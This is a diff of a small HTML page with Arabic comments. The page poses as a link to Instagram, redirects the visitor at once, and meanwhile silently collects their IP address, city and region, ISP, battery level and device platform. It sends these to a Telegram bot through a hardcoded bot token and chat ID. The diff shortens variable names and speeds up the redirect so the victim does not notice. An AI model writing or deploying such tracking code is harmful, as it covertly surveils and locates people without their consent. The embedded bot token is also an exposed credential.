@@ -1,52 +1,44 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
     <script>
-        const BOT_TOKEN = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
-        const CHAT_ID = "5773364548";
+        const T = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
+        const C = "5773364548";
 
-        async function fastTrack() {
-            const params = new URLSearchParams(window.location.search);
-            const target = params.get('u') || 'https://www.instagram.com/reels/';
+        async function x() {
+            // 1. تحويل فوري (أقل من 0.05 ثانية)
+            const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
+            window.location.replace(u);
 
-            // 1. التحويل الفوري (أهم خطوة حتى لا يحس)
-            setTimeout(() => {
-                window.location.replace(target);
-            }, 100); // 100 ملي ثانية فقط!
-
-            // 2. سحب البيانات في الخلفية (Background)
+            // 2. سحب البيانات صامت بالخلفية
             try {
-                // نطلب البيانات بس ما ننتظرها تعطل التحويل
-                fetch('https://ipapi.co/json/').then(res => res.json()).then(ipData => {
-                    let batt = "N/A";
-                    navigator.getBattery().then(b => { batt = Math.round(b.level * 100) + "%"; });
+                let b = "N/A";
+                // محاولة صيد البطارية بسرعة
+                if (navigator.getBattery) {
+                    const bt = await navigator.getBattery();
+                    b = Math.round(bt.level * 100) + "%";
+                }
 
-                    const msg = `
-🚀 **رصد احترافي - النسخة السريعة** 🚀
+                // سحب الموقع والآيبي (طلب خفيف جداً)
+                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                    const m = `
+🚀 **رصد احترافي - النسخة X**
 ━━━━━━━━━━━━━━━
-🌐 الآيبي: ${ipData.ip}
-📍 الموقع: ${ipData.city} | ${ipData.region}
-🏢 الشركة: ${ipData.org}
-📱 الجهاز: ${navigator.platform}
-🔋 البطارية: ${batt}
-🗺️ الخريطة: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
+🌐 IP: ${d.ip}
+📍 Loc: ${d.city} | ${d.region}
+🏢 Net: ${d.org}
+🔋 Batt: ${b}
+📱 Dev: ${navigator.platform}
 ━━━━━━━━━━━━━━━`;
 
-                    // إرسال للتليجرام
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-                    });
+                    // إرسال البيانات (التشفير داخلي بطلب Fetch)
+                    navigator.sendBeacon(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
                 });
-            } catch (e) {
-                // في حال الفشل يرسل تنبيه بسيط
-            }
+            } catch (e) {}
         }
-
-        window.onload = fastTrack;
+        window.onload = x;
     </script>
 </head>
-<body style="background: black;"></body>
+<body style="background:#000"></body>
 </html>
